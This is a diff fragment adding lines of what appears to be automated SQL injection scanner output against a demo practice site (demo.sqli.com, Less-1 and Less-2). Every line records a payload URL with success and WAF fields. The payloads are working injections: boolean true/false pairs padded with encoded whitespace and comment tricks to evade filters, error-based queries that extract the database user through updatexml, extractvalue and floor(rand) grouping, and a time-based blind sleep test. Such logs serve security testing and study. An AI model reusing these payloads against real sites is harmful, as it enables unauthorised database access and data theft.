@@ -278,3 +278,210 @@
 [+56+] SQL syntax  [852] payload : [http://demo.sqli.com/Less-3/?id=1')%20and%20/*!and/*/**//*!/*!1*/ ]
 [+57+] SQL syntax  [833] payload : [http://demo.sqli.com/Less-3/?id=1')%0b%0c%0b%0dand%0b%0c%0b%0d{``1=1} ]
 [+62+] SQL syntax  [833] payload : [http://demo.sqli.com/Less-3/?id=1')/***/xor/***/1&&1--+]
+{'type': 'SQL syntax', 'payload': "http://demo.sqli.com/Less-1/?id=1'-----http://demo.sqli.com/Less-1/?id=1'", 'success': 'True', 'waf': 'None'}
+{'type': 'SQL syntax', 'payload': 'http://demo.sqli.com/Less-1/?id=1%df%27-----http://demo.sqli.com/Less-1/?id=1%df%27', 'success': 'True', 'waf': 'None'}
+{'type': 'SQL syntax', 'payload': 'http://demo.sqli.com/Less-1/?id=1\\-----http://demo.sqli.com/Less-1/?id=1\\', 'success': 'True', 'waf': 'None'}
+{'type': 'SQL syntax', 'payload': "http://demo.sqli.com/Less-1/?id=1'%a0and%a01 -----http://demo.sqli.com/Less-1/?id=1'%a0and%a00 ", 'success': 'True', 'waf': 'None'}
+{'type': '字符型', 'payload': "http://demo.sqli.com/Less-1/?id=1'%0b%0c%0b%0dand%0b%0c%0b%0d1 like 1%23-----http://demo.sqli.com/Less-1/?id=1'%0b%0c%0b%0dand%0b%0c%0b%0d1 like 2%23", 'success': 'True', 'waf': 'None'}
+{'type': 'SQL syntax', 'payload': "http://demo.sqli.com/Less-1/?id=1'%20and%20/*!and/*/**//*!/*!1*/%23-----http://demo.sqli.com/Less-1/?id=1'%20and%20/*!and/*/**//*!/*!0*/%23", 'success': 'True', 'waf': 'None'}
+{'type': '字符型', 'payload': "http://demo.sqli.com/Less-1/?id=1'%0b%0c%0b%0dxor%0b%0c%0b%0d{``1=1}--+-----http://demo.sqli.com/Less-1/?id=1'%0b%0c%0b%0dxor%0b%0c%0b%0d{``1=2}--+", 'success': 'True', 'waf': 'None'}
+{'type': 'SQL syntax', 'payload': "http://demo.sqli.com/Less-1/?id=1' xor 1 -----http://demo.sqli.com/Less-1/?id=1' xor 0 ", 'success': 'True', 'waf': 'None'}
+{'type': 'SQL syntax', 'payload': "http://demo.sqli.com/Less-1/?id=1'%0b%0c%0b%0dxor%0b%0c%0b%0d2<<1 -----http://demo.sqli.com/Less-1/?id=1'%0b%0c%0b%0dxor%0b%0c%0b%0d0<<2 ", 'success': 'True', 'waf': 'None'}
+{'type': '字符型', 'payload': "http://demo.sqli.com/Less-1/?id=1'/***/and/***/1|1%23-----http://demo.sqli.com/Less-1/?id=1'/***/and/***/0|0%23", 'success': 'True', 'waf': 'None'}
+{'type': 'SQL syntax', 'payload': "http://demo.sqli.com/Less-1/?id=1'/***/and/***/1||1 -----http://demo.sqli.com/Less-1/?id=1'/***/and/***/0||0 ", 'success': 'True', 'waf': 'None'}
+{'type': 'SQL syntax', 'payload': "http://demo.sqli.com/Less-1/?id=1' and 1&&1 -----http://demo.sqli.com/Less-1/?id=1' and 0&&1 ", 'success': 'True', 'waf': 'None'}
+{'type': 'SQL syntax', 'payload': "http://demo.sqli.com/Less-1/?id=1'/***/and/***/1^1 -----http://demo.sqli.com/Less-1/?id=1'/***/and/***/1^0 ", 'success': 'True', 'waf': 'None'}
+{'type': 'SQL syntax', 'payload': "http://demo.sqli.com/Less-1/?id=1')%20xor%201%23-----http://demo.sqli.com/Less-1/?id=1')%20xor%200%23", 'success': 'True', 'waf': 'None'}
+{'type': 'SQL syntax', 'payload': "http://demo.sqli.com/Less-1/?id=1')%a0xor%a01 like 1 -----http://demo.sqli.com/Less-1/?id=1')%a0xor%a01 like 2 ", 'success': 'True', 'waf': 'None'}
+{'type': 'SQL syntax', 'payload': "http://demo.sqli.com/Less-1/?id=1')%20and%20/*!and/*/**//*!/*!1*/--+-----http://demo.sqli.com/Less-1/?id=1')%20and%20/*!and/*/**//*!/*!0*/--+", 'success': 'True', 'waf': 'None'}
+{'type': 'SQL syntax', 'payload': "http://demo.sqli.com/Less-1/?id=1')%a0xor%a0{``1=1}%23-----http://demo.sqli.com/Less-1/?id=1')%a0xor%a0{``1=2}%23", 'success': 'True', 'waf': 'None'}
+{'type': 'SQL syntax', 'payload': "http://demo.sqli.com/Less-1/?id=1')%09xor%091 -----http://demo.sqli.com/Less-1/?id=1')%09xor%090 ", 'success': 'True', 'waf': 'None'}
+{'type': 'SQL syntax', 'payload': "http://demo.sqli.com/Less-1/?id=1')%0b%0c%0b%0dand%0b%0c%0b%0d2<<1%23-----http://demo.sqli.com/Less-1/?id=1')%0b%0c%0b%0dand%0b%0c%0b%0d0<<2%23", 'success': 'True', 'waf': 'None'}
+{'type': 'SQL syntax', 'payload': "http://demo.sqli.com/Less-1/?id=1') and 1|1%23-----http://demo.sqli.com/Less-1/?id=1') and 0|0%23", 'success': 'True', 'waf': 'None'}
+{'type': 'SQL syntax', 'payload': "http://demo.sqli.com/Less-1/?id=1')%a0xor%a01||1 -----http://demo.sqli.com/Less-1/?id=1')%a0xor%a00||0 ", 'success': 'True', 'waf': 'None'}
+{'type': 'SQL syntax', 'payload': "http://demo.sqli.com/Less-1/?id=1')%0b%0c%0b%0dand%0b%0c%0b%0d1&&1%23-----http://demo.sqli.com/Less-1/?id=1')%0b%0c%0b%0dand%0b%0c%0b%0d0&&1%23", 'success': 'True', 'waf': 'None'}
+{'type': 'SQL syntax', 'payload': "http://demo.sqli.com/Less-1/?id=1')%20and%201^1--+-----http://demo.sqli.com/Less-1/?id=1')%20and%201^0--+", 'success': 'True', 'waf': 'None'}
+{'type': '报错型', 'user': 'root@localhost', 'payload': "http://demo.sqli.com/Less-1/?id=1' and (select 1 from(select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--+", 'success': 'True', 'waf': 'None'}
+{'type': '报错型', 'user': 'root@localhost', 'payload': "http://demo.sqli.com/Less-1/?id=1' and (select 1 from (select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))b from information_schema.tables group by b)a)--+", 'success': 'True', 'waf': 'None'}
+{'type': '报错型', 'user': 'root@localhost', 'payload': "http://demo.sqli.com/Less-1/?id=1' union select count(*),1,concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.tables group by x --+", 'success': 'True', 'waf': 'None'}
+{'type': '报错型', 'user': 'root@localhost', 'payload': "http://demo.sqli.com/Less-1/?id=1' and (updatexml(1,concat(0x5e5e5e,(select user()),0x5e5e5e),1))%23", 'success': 'True', 'waf': 'None'}
+{'type': '报错型', 'user': 'root@localhost', 'payload': "http://demo.sqli.com/Less-1/?id=1' and (extractvalue(1,concat(0x5e5e5e,(select user()),0x5e5e5e)))%23", 'success': 'True', 'waf': 'None'}
+{'type': '盲注', 'payload': "http://demo.sqli.com/Less-1/?id=1' and sleep( if( (select length(database()) = 8) , 5, 0 ) )--+", 'success': 'True', 'waf': 'None'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1'-----http://demo.sqli.com/Less-2/?id=1'"}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1"-----http://demo.sqli.com/Less-2/?id=1"'}
+{'type': '', 'success': 'Maybe', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1%df%27-----http://demo.sqli.com/Less-2/?id=1%df%27'}
+{'type': '', 'success': 'Maybe', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1%df%22-----http://demo.sqli.com/Less-2/?id=1%df%22'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1\\-----http://demo.sqli.com/Less-2/?id=1\\'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1/***/or-----http://demo.sqli.com/Less-2/?id=1/***/or'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1/***/xor-----http://demo.sqli.com/Less-2/?id=1/***/xor'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1@-----http://demo.sqli.com/Less-2/?id=1@'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1%-----http://demo.sqli.com/Less-2/?id=1%'}
+{'type': '', 'success': 'Maybe', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1$-----http://demo.sqli.com/Less-2/?id=1$'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1^-----http://demo.sqli.com/Less-2/?id=1^'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1!-----http://demo.sqli.com/Less-2/?id=1!'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1[-----http://demo.sqli.com/Less-2/?id=1['}
+{'type': '数字型', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1%0b%0c%0b%0dxor%0b%0c%0b%0d1-----http://demo.sqli.com/Less-2/?id=1%0b%0c%0b%0dxor%0b%0c%0b%0d0'}
+{'type': '数字型', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1%0b%0c%0b%0dxor%0b%0c%0b%0d1 like 1-----http://demo.sqli.com/Less-2/?id=1%0b%0c%0b%0dxor%0b%0c%0b%0d1 like 2'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1%0b%0c%0b%0dxor%0b%0c%0b%0d/*!and/*/**//*!/*!1*/-----http://demo.sqli.com/Less-2/?id=1%0b%0c%0b%0dxor%0b%0c%0b%0d/*!and/*/**//*!/*!0*/'}
+{'type': '数字型', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1%09and%09{``1=1}-----http://demo.sqli.com/Less-2/?id=1%09and%09{``1=2}'}
+{'type': '数字型', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1/***/xor/***/1-----http://demo.sqli.com/Less-2/?id=1/***/xor/***/0'}
+{'type': '数字型', 'success': 'Maybe', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1%a0and%a02<<1-----http://demo.sqli.com/Less-2/?id=1%a0and%a00<<2'}
+{'type': '数字型', 'success': 'Maybe', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1%a0xor%a01|1-----http://demo.sqli.com/Less-2/?id=1%a0xor%a00|0'}
+{'type': '数字型', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1/***/and/***/1||1-----http://demo.sqli.com/Less-2/?id=1/***/and/***/0||0'}
+{'type': '数字型', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1/***/and/***/1&&1-----http://demo.sqli.com/Less-2/?id=1/***/and/***/0&&1'}
+{'type': '数字型', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1/***/xor/***/1^1-----http://demo.sqli.com/Less-2/?id=1/***/xor/***/1^0'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1' xor 1 -----http://demo.sqli.com/Less-2/?id=1' xor 0 "}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1'%09xor%091 like 1 -----http://demo.sqli.com/Less-2/?id=1'%09xor%091 like 2 "}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1'%09xor%09/*!and/*/**//*!/*!1*/--+-----http://demo.sqli.com/Less-2/?id=1'%09xor%09/*!and/*/**//*!/*!0*/--+"}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1'%0b%0c%0b%0dxor%0b%0c%0b%0d{``1=1}%23-----http://demo.sqli.com/Less-2/?id=1'%0b%0c%0b%0dxor%0b%0c%0b%0d{``1=2}%23"}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1'%0b%0c%0b%0dxor%0b%0c%0b%0d1 -----http://demo.sqli.com/Less-2/?id=1'%0b%0c%0b%0dxor%0b%0c%0b%0d0 "}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1'/***/and/***/2<<1 -----http://demo.sqli.com/Less-2/?id=1'/***/and/***/0<<2 "}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1'/***/and/***/1|1--+-----http://demo.sqli.com/Less-2/?id=1'/***/and/***/0|0--+"}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1'/***/and/***/1||1%23-----http://demo.sqli.com/Less-2/?id=1'/***/and/***/0||0%23"}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1' and 1&&1 -----http://demo.sqli.com/Less-2/?id=1' and 0&&1 "}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1'%0b%0c%0b%0dxor%0b%0c%0b%0d1^1 -----http://demo.sqli.com/Less-2/?id=1'%0b%0c%0b%0dxor%0b%0c%0b%0d1^0 "}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1" xor 1--+-----http://demo.sqli.com/Less-2/?id=1" xor 0--+'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1"/***/and/***/1 like 1--+-----http://demo.sqli.com/Less-2/?id=1"/***/and/***/1 like 2--+'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1"%a0and%a0/*!and/*/**//*!/*!1*/%23-----http://demo.sqli.com/Less-2/?id=1"%a0and%a0/*!and/*/**//*!/*!0*/%23'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1"%20xor%20{``1=1} -----http://demo.sqli.com/Less-2/?id=1"%20xor%20{``1=2} '}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1"/***/xor/***/1 -----http://demo.sqli.com/Less-2/?id=1"/***/xor/***/0 '}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1"/***/xor/***/2<<1 -----http://demo.sqli.com/Less-2/?id=1"/***/xor/***/0<<2 '}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1"/***/xor/***/1|1--+-----http://demo.sqli.com/Less-2/?id=1"/***/xor/***/0|0--+'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1" and 1||1%23-----http://demo.sqli.com/Less-2/?id=1" and 0||0%23'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1"%a0and%a01&&1%23-----http://demo.sqli.com/Less-2/?id=1"%a0and%a00&&1%23'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1"%09and%091^1 -----http://demo.sqli.com/Less-2/?id=1"%09and%091^0 '}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1\\/***/and/***/1%23-----http://demo.sqli.com/Less-2/?id=1\\/***/and/***/0%23'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1\\%09and%091 like 1 -----http://demo.sqli.com/Less-2/?id=1\\%09and%091 like 2 '}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1\\%a0and%a0/*!and/*/**//*!/*!1*/ -----http://demo.sqli.com/Less-2/?id=1\\%a0and%a0/*!and/*/**//*!/*!0*/ '}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1\\%20and%20{``1=1}--+-----http://demo.sqli.com/Less-2/?id=1\\%20and%20{``1=2}--+'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1\\%20xor%201 -----http://demo.sqli.com/Less-2/?id=1\\%20xor%200 '}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1\\%09and%092<<1 -----http://demo.sqli.com/Less-2/?id=1\\%09and%090<<2 '}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1\\%09xor%091|1 -----http://demo.sqli.com/Less-2/?id=1\\%09xor%090|0 '}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1\\%a0and%a01||1 -----http://demo.sqli.com/Less-2/?id=1\\%a0and%a00||0 '}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1\\%20xor%201&&1 -----http://demo.sqli.com/Less-2/?id=1\\%20xor%200&&1 '}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1\\/***/xor/***/1^1 -----http://demo.sqli.com/Less-2/?id=1\\/***/xor/***/1^0 '}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1')%0b%0c%0b%0dand%0b%0c%0b%0d1%23-----http://demo.sqli.com/Less-2/?id=1')%0b%0c%0b%0dand%0b%0c%0b%0d0%23"}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1') and 1 like 1%23-----http://demo.sqli.com/Less-2/?id=1') and 1 like 2%23"}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1')%a0xor%a0/*!and/*/**//*!/*!1*/ -----http://demo.sqli.com/Less-2/?id=1')%a0xor%a0/*!and/*/**//*!/*!0*/ "}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1')%a0and%a0{``1=1}%23-----http://demo.sqli.com/Less-2/?id=1')%a0and%a0{``1=2}%23"}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1')/***/and/***/1 -----http://demo.sqli.com/Less-2/?id=1')/***/and/***/0 "}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1')/***/and/***/2<<1%23-----http://demo.sqli.com/Less-2/?id=1')/***/and/***/0<<2%23"}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1')%0b%0c%0b%0dxor%0b%0c%0b%0d1|1--+-----http://demo.sqli.com/Less-2/?id=1')%0b%0c%0b%0dxor%0b%0c%0b%0d0|0--+"}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1')%20xor%201||1--+-----http://demo.sqli.com/Less-2/?id=1')%20xor%200||0--+"}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1')/***/xor/***/1&&1 -----http://demo.sqli.com/Less-2/?id=1')/***/xor/***/0&&1 "}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1')%09and%091^1%23-----http://demo.sqli.com/Less-2/?id=1')%09and%091^0%23"}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1") and 1%23-----http://demo.sqli.com/Less-2/?id=1") and 0%23'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1") and 1 like 1 -----http://demo.sqli.com/Less-2/?id=1") and 1 like 2 '}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1")%09xor%09/*!and/*/**//*!/*!1*/--+-----http://demo.sqli.com/Less-2/?id=1")%09xor%09/*!and/*/**//*!/*!0*/--+'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1")%a0xor%a0{``1=1}--+-----http://demo.sqli.com/Less-2/?id=1")%a0xor%a0{``1=2}--+'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1") xor 1 -----http://demo.sqli.com/Less-2/?id=1") xor 0 '}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1")/***/and/***/2<<1%23-----http://demo.sqli.com/Less-2/?id=1")/***/and/***/0<<2%23'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1")%09and%091|1--+-----http://demo.sqli.com/Less-2/?id=1")%09and%090|0--+'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1")%09xor%091||1 -----http://demo.sqli.com/Less-2/?id=1")%09xor%090||0 '}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1")%0b%0c%0b%0dxor%0b%0c%0b%0d1&&1%23-----http://demo.sqli.com/Less-2/?id=1")%0b%0c%0b%0dxor%0b%0c%0b%0d0&&1%23'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1")%0b%0c%0b%0dxor%0b%0c%0b%0d1^1 -----http://demo.sqli.com/Less-2/?id=1")%0b%0c%0b%0dxor%0b%0c%0b%0d1^0 '}
+{'type': '报错型', 'success': 'True', 'waf': 'None', 'user': 'root@localhost', 'payload': 'http://demo.sqli.com/Less-2/?id=1 and (select 1 from(select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--+'}
+{'type': '报错型', 'success': 'True', 'waf': 'None', 'user': 'root@localhost', 'payload': 'http://demo.sqli.com/Less-2/?id=1 and (select 1 from (select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))b from information_schema.tables group by b)a)%23'}
+{'type': '报错型', 'success': 'True', 'waf': 'None', 'user': 'root@localhost', 'payload': 'http://demo.sqli.com/Less-2/?id=1 union select count(*),1,concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.tables group by x %23'}
+{'type': '报错型', 'success': 'True', 'waf': 'None', 'user': 'root@localhost', 'payload': 'http://demo.sqli.com/Less-2/?id=1 and (updatexml(1,concat(0x5e5e5e,(select user()),0x5e5e5e),1))--+'}
+{'type': '报错型', 'success': 'True', 'waf': 'None', 'user': 'root@localhost', 'payload': 'http://demo.sqli.com/Less-2/?id=1 and (extractvalue(1,concat(0x5e5e5e,(select user()),0x5e5e5e)))%23'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1" and (select 1 from(select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--+-----http://demo.sqli.com/Less-2/?id=1" and (select 1 from(select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--+'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1" and (select 1 from (select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))b from information_schema.tables group by b)a)%23-----http://demo.sqli.com/Less-2/?id=1" and (select 1 from (select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))b from information_schema.tables group by b)a)%23'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1" union select count(*),1,concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.tables group by x --+-----http://demo.sqli.com/Less-2/?id=1" union select count(*),1,concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.tables group by x --+'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1" and (updatexml(1,concat(0x5e5e5e,(select user()),0x5e5e5e),1))--+-----http://demo.sqli.com/Less-2/?id=1" and (updatexml(1,concat(0x5e5e5e,(select user()),0x5e5e5e),1))--+'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1" and (extractvalue(1,concat(0x5e5e5e,(select user()),0x5e5e5e)))%23-----http://demo.sqli.com/Less-2/?id=1" and (extractvalue(1,concat(0x5e5e5e,(select user()),0x5e5e5e)))%23'}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1' and (select 1 from(select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.character_sets group by x)a)%23-----http://demo.sqli.com/Less-2/?id=1' and (select 1 from(select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.character_sets group by x)a)%23"}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1' and (select 1 from (select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))b from information_schema.tables group by b)a)--+-----http://demo.sqli.com/Less-2/?id=1' and (select 1 from (select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))b from information_schema.tables group by b)a)--+"}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1' union select count(*),1,concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.tables group by x %23-----http://demo.sqli.com/Less-2/?id=1' union select count(*),1,concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.tables group by x %23"}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1' and (updatexml(1,concat(0x5e5e5e,(select user()),0x5e5e5e),1))%23-----http://demo.sqli.com/Less-2/?id=1' and (updatexml(1,concat(0x5e5e5e,(select user()),0x5e5e5e),1))%23"}
+{'type': 'SQL syntax', 'success': 'True', 'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1' and (extractvalue(1,concat(0x5e5e5e,(select user()),0x5e5e5e)))--+-----http://demo.sqli.com/Less-2/?id=1' and (extractvalue(1,concat(0x5e5e5e,(select user()),0x5e5e5e)))--+"}
+{'type': '盲注', 'success': 'True', 'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1 and sleep( if( (select length(database()) = 8) , 5, 0 ) )--+'}
+{'waf': 'None', 'payload': "http://demo.sqli.com/Less-2/?id=1'-----http://demo.sqli.com/Less-2/?id=1'", 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1"-----http://demo.sqli.com/Less-2/?id=1"', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1%df%27-----http://demo.sqli.com/Less-2/?id=1%df%27', 'success': 'Maybe', 'type': ''}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1%df%22-----http://demo.sqli.com/Less-2/?id=1%df%22', 'success': 'Maybe', 'type': ''}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1\\-----http://demo.sqli.com/Less-2/?id=1\\', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1/***/or-----http://demo.sqli.com/Less-2/?id=1/***/or', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1/***/xor-----http://demo.sqli.com/Less-2/?id=1/***/xor', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1@-----http://demo.sqli.com/Less-2/?id=1@', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1%-----http://demo.sqli.com/Less-2/?id=1%', 'success': 'True', 'type': 'SQL syntax'}
+{'waf': 'None', 'payload': 'http://demo.sqli.com/Less-2/?id=1$-----http://demo.sqli.com/Less-2/?id=1$', 'success': 'Maybe', 'type': ''}
